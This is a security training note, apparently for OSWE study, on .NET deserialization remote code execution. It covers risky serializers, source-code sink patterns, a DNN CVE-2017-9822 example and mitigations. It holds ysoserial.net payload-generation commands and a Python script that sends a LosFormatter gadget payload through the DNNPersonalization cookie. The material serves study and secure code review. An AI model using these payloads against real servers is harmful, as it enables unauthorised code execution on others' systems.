---
name: ".NET Deserialization RCE"
description: "Understanding .NET serializers (BinaryFormatter, LosFormatter, ObjectStateFormatter, etc.), ysoserial.net gadget chains, identifying deserialization sinks in source code, common patterns, and mitigation."
tags: [oswe, dotnet, deserialization, rce, binaryformatter, losformatter, ysoserial]
---

## .NET Deserialization RCE

### Understanding .NET Serialization

.NET memiliki beberapa serializer yang bisa disalahgunakan untuk RCE:

| Serializer | Method | How it works | Risky? |
|-----------|--------|-------------|--------|
| `BinaryFormatter` | `Deserialize()` | Full object graph deserialization | **High** |
| `LosFormatter` | `Deserialize()` | Used by ASP.NET ViewState / DNN | **High** |
| `ObjectStateFormatter` | `Deserialize()` | Similar to LosFormatter | **High** |
| `NetDataContractSerializer` | `Deserialize()` | Full type fidelity | **High** |
| `SoapFormatter` | `Deserialize()` | SOAP-based, full type | **High** |
| `XmlSerializer` | `Deserialize()` | XML-based, type-restricted | **Medium** |
| `DataContractSerializer` | `ReadObject()` | XML-based, opt-in types | **Medium** |
| `JavaScriptSerializer` | `Deserialize()` | JSON-based, limited | **Low** |
| `Newtonsoft.Json` | `TypeNameHandling.Auto/All` | JSON with $type | **High** |

### ysoserial.net Gadget Chains

**Tool**: [ysoserial.net](https://github.com/pwntester/ysoserial.net)

```powershell
# TypeConfuseDelegate — most versatile
ysoserial.exe -f LosFormatter -g TypeConfuseDelegate -c "powershell -enc BASE64"

# ObjectDataProvider
ysoserial.exe -f LosFormatter -g ObjectDataProvider -c "powershell -enc BASE64"

# ActivitySurrogateSelector — for BinaryFormatter
ysoserial.exe -f BinaryFormatter -g ActivitySurrogateSelector -c "powershell -enc BASE64"

# FileSavePicker / FileDeletePicker — for file operations
ysoserial.exe -f BinaryFormatter -g FileSavePicker -c "C:\path\to\write"
```

### Source Code Review Patterns

**Primary Sinks**:
```csharp
// BinaryFormatter — most dangerous
BinaryFormatter formatter = new BinaryFormatter();
object obj = formatter.Deserialize(stream);

// LosFormatter — ASP.NET ViewState / DNN
LosFormatter formatter = new LosFormatter();
object obj = formatter.Deserialize(serializedData);

// ObjectStateFormatter — similar to LosFormatter
ObjectStateFormatter formatter = new ObjectStateFormatter();
object obj = formatter.Deserialize(serializedData);

// Newtonsoft.Json with TypeNameHandling
JsonSerializerSettings settings = new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.Auto  // or All
};
object obj = JsonConvert.DeserializeObject(json, settings);
```

**DNN-specific Pattern (CVE-2017-9822)**:
```csharp
// Hardcoded encryption key + LosFormatter
string key = "F8B2E5D9A7C34F1B";  // example hardcoded key
byte[] keyBytes = Encoding.UTF8.GetBytes(key);
// Decrypt cookie → deserialize with LosFormatter
LosFormatter formatter = new LosFormatter();
formatter.Deserialize(decryptedData);
```

### Exploit Flow

1. **Identify sink**: Find `Deserialize()` call in source code
2. **Determine serializer**: BinaryFormatter, LosFormatter, etc.
3. **Check for encryption**: If data is encrypted before deserialization, find the key
4. **Generate payload**: Use ysoserial.net with correct formatter and gadget
5. **Send payload**: Encode/gadget chain and send to target

```python
import requests
import subprocess
import base64

TARGET = "http://target"
YSOSERIAL = "ysoserial.exe"

def gen_payload(formatter, gadget, command):
    cmd = f"mono {YSOSERIAL} -f {formatter} -g {gadget} -c \"{command}\""
    result = subprocess.check_output(cmd, shell=True)
    return result.strip()

payload = gen_payload("LosFormatter", "TypeConfuseDelegate", "powershell -enc BASE64")
cookies = {"DNNPersonalization": payload}
r = requests.get(TARGET, cookies=cookies)
```

### Mitigation

```csharp
// Replace BinaryFormatter with safer alternatives
// Use JsonSerializer with TypeNameHandling.None
JsonSerializerSettings settings = new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.None
};

// Use DataContractSerializer with explicit known types
DataContractSerializer serializer = new DataContractSerializer(typeof(KnownType));

// Implement custom SerializationBinder to restrict types
formatter.Binder = new CustomBinder();
```
